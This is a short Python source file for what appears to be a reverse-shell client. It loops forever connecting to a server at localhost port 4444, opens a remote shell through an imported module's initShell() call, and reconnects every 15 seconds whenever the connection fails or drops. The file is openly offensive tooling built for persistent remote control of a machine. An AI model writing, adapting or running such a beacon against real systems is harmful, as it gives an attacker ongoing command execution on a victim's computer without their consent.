import time
from tools import NewConnection, connectedToInternet

class Client:
    def __init__(self, server_ip, server_port):
        self.waitTime = 15
        if not connectedToInternet():
            exit("Error: Device is not connected to the internet!")
        self.s = NewConnection(server_ip, server_port, logger=True)

    def run(self):
        while True:
            print("Connecting...")
            connected = self.s.connect()
            if not connected:
                print("Sleeping...")
                time.sleep(self.waitTime)
                continue
            print("Connected!")
            self.s.initShell()
            print("Disconnected!")
            time.sleep(self.waitTime)
            self.s.newSocket()

if __name__ == "__main__":
    c = Client("localhost", 4444)
    c.run()